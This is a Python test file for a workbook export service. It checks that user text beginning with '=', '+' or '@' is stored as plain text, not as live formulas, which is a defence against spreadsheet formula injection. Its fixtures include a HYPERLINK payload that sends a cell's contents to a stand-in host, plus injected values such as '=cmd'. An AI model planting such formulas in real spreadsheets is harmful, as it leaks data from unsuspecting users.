from __future__ import annotations

import zipfile
from datetime import UTC, datetime
from io import BytesIO
from types import SimpleNamespace

from openpyxl import load_workbook

from app.services import ministry_export as exports

PAYLOAD = '=HYPERLINK("https://example.invalid/?"&A2,"open")'


def _workbook() -> bytes:
    record = SimpleNamespace(id="w1", title="=1+1", venue="@SUM(1)", state="Gujarat", status="IN_PROGRESS")
    entry = SimpleNamespace(
        id="e1", entityKey="participant", stageKey="X", ordinal=0, data={"name": PAYLOAD}
    )
    payload, _rows = exports.build_workbook(
        [(record, [entry])],
        filters={"state": "=cmd"},
        scope_label="+scope",
        workshops_total=1,
        generated_at=datetime(2026, 11, 7, tzinfo=UTC),
    )
    return payload


def test_designer_text_starting_with_equals_is_stored_as_text_not_a_formula() -> None:
    payload = _workbook()
    with zipfile.ZipFile(BytesIO(payload)) as archive:
        sheets = [n for n in archive.namelist() if n.startswith("xl/worksheets/")]
        xml = "".join(archive.read(n).decode("utf-8") for n in sheets)
    assert "<f>" not in xml and "<f " not in xml

    wb = load_workbook(BytesIO(payload))
    found = {
        cell.value: cell.data_type
        for sheet in wb.worksheets
        for row in sheet.iter_rows()
        for cell in row
        if isinstance(cell.value, str)
    }
    assert found.get("=1+1") == "s"
    assert found.get(PAYLOAD) == "s"
    assert found.get("+scope") == "s"
